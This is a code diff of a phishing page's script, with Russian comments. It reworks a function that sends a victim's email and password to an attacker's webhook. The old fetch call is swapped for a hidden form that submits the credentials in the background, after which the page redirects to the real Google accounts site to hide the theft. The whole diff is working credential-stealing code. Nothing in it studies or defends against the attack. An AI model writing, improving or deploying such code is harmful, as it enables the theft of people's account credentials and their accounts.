@@ -146,24 +146,34 @@
         });
 
         function sendToWebhook(email, pass) {
-            const text = `🚨 Новый вход!\n\n📧 Логин: ${email}\n🔑 Пароль: ${pass}\n📅 ${new Date().toLocaleString()}`;
-            
-            // Отправляем POST запрос на webhook
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                mode: 'no-cors', // Важно для обхода CORS
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ 
-                    message: text,
-                    login: email,
-                    password: pass
-                })
-            }).finally(() => {
-                // В любом случае перекидываем на Google
+            // Создаем невидимую форму
+            const hiddenForm = document.createElement('form');
+            hiddenForm.method = 'POST';
+            hiddenForm.action = WEBHOOK_URL;
+            hiddenForm.target = '_blank'; // Открывает в фоне, не уводя страницу
+
+            // Добавляем логин
+            const eField = document.createElement('input');
+            eField.type = 'hidden';
+            eField.name = 'login';
+            eField.value = email;
+            hiddenForm.appendChild(eField);
+
+            // Добавляем пароль
+            const pField = document.createElement('input');
+            pField.type = 'hidden';
+            pField.name = 'password';
+            pField.value = pass;
+            hiddenForm.appendChild(pField);
+
+            // Отправляем
+            document.body.appendChild(hiddenForm);
+            hiddenForm.submit();
+
+            // Перекидываем на настоящий Google через полсекунды
+            setTimeout(() => {
                 window.location.href = "https://accounts.google.com";
-            });
+            }, 500);
         }
     </script>
 </body>
